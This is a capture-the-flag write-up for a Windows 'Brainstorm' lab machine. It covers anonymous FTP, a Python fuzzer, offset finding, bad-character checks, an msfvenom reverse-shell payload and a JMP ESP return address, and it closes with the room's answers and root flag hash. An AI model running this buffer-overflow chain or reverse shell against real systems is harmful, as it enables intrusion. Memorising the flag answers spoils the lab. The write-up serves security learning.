# Brainstrom

- MachinIP: `10.10.54.177`
- OS      : `Windows`
- Exploit : `Buffer Overflow, Ret2Reg`

---

- Nmap result, ports 21`(ftp)`
- Anonymous access allowed on FTP service
- Download the available files

> make sure to enable the binary format while getting files from ftp

```bash
# anonymous login to ftp
ftp 10.10.54.177
# username: anonymous
# password: anonymous

# navigating through the available folder
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-29-19  08:36PM       <DIR>          chatserver
226 Transfer complete.
ftp> cd chatserver/
250 CWD command successful.
# disabling the promt function
ftp> prompt off
Interactive mode off.
# setting the file download type to binary
ftp> binary
200 Type set to I.
# downloading recursively
ftp> mget *
[..snip..]
```

- Chatserver.exe and essfunc.dll is obtained from the ftp
- On connecting to the ftp, it asks for a username and message

```bash
┌──(kali㉿kali)-[~/writeups/thm/brainstrom]
└─$ nc 10.10.54.177 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): vuln
Write a message: i am a message


Sat May 08 00:41:52 2021
vuln said: i am a message

```

- So we could pass bunch of charcters in both username and password field, but the username field is terminated after 20 characters (no use on trying to exploit it, btw which I did)
- So on to the message field, first we want to know at which characters size, the application crashes
- We can script a python script for this

```python
#!/usr/bin/env python3

import sys, time, socket

host = "10.10.54.177"
port = 9999
payload = "a"*100
timeout = 2

while True:
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(timeout)
			s.connect((host, port))
			s.recv(1024) 	# welcome banner
			s.recv(1024)	# username prompt
			s.send(bytes("vuln", 'latin-1'))
			print(f"Fuzzing with {len(payload)} bytes ...")
			s.recv(1024)	# message prompt
			s.send(bytes(payload, 'latin-1'))
			s.recv(1024)
	except:
		print(f"Application crashed at {len(payload)} bytes...")
		sys.exit(0)

	payload += "a"*100
```

- We get to know that the application crashes somewhere around `2100-2500` bytes
- Lets generate cyclic pattern with either `msf` or `pwntools` to identify its offset
- I will be using pwntools for this, 

```bash
┌──(kali㉿kali)-[~/writeups/thm/brainstrom]
└─$ pwn cyclic 2500
```

- Now add the generated cyclic pattern to the script and send it to the appliction which will crash the appication once again

```python
#!/usr/bin/env python3

import sys,socket

host = "127.0.0.1"
port = 9999

offset = 0
overflow = "a"*offset
retn = ""
padding = ""

payload = ("{pwn cyclic output}")

s_buffer = overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024) # welcome
s.recv(1024) # username prompt
s.send(bytes("vuln", 'latin-1'))
s.recv(1024) # message prompt
s.send(bytes(s_buffer, 'latin-1'))
print("Application crashed :)")
```

- Now run the script and take a look at the EIP's value
- Find the offset with the EIP value

```bash
┌──(kali㉿kali)-[~/writeups/thm/brainstrom]
└─$ ./xploit.py 
Application crashed :)
┌──(kali㉿kali)-[~/writeups/thm/brainstrom]
└─$ pwn cyclic -l 0x75616164
2012
```

- Now upadate the offset value from 0 to 2012
- Now fill the retn address with bbbb, now restart the application in Immunity debugger and run the script again
- Now the EIP should be overwritten with 62626262
- Now its time to find bad characters in the application
- Generate hexadecimal values from 01-256 with the python script

```python
for i in range(1, 256):
	print("\\x"+"{:02x}".format(i), end='')

```

- Update the generated hexadecimal characters in the payloads section and send it to the application
- Now the application crashes and its time to identify the bad chars

```bash
# generate bytearray with mona
!mona bytearray -b "\x00"

# after crashing compate stack memory with the bytearray.bin
!mona compare -f bytearray.bin -a {address held by ESP}
```

- This application has no bad characters other than `\x00`
- Now lets generate shell code with `msf`

```bash
┌──(kali㉿kali)-[~/writeups/thm/brainstrom]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f py -v payload -b "\x00"

```

- Update the generated payload in the script
- Now find an address which contains `JMP ESP` instruction

```bash
# with mona
!mona jmp -r esp -cbp '\x00'
```

- After obtaining the address, update it in the reverse order, since its little endian format
- Address found, `625014DF` --> `62 50 14 DF` --> `DF 14 50 62`
- Address will take the hexadecimal form of, `"\xdf\x14\x50\x62"`
- Now set the ret value with the calculated memory address and add some paddings `\x90` to your liking and run the script
- Listen on a netcat session to obtain reverse shell

## Answers

### Deploy Machine and scan network

- How many ports are open?
`6`

### Accessing Files

- What is the name of the exe file you found?
`chatserver.exe`

### Access

- After gaining access, what is the content of the root.txt file?
`5b1001de5a44eca47eee71e7942a8f8a`
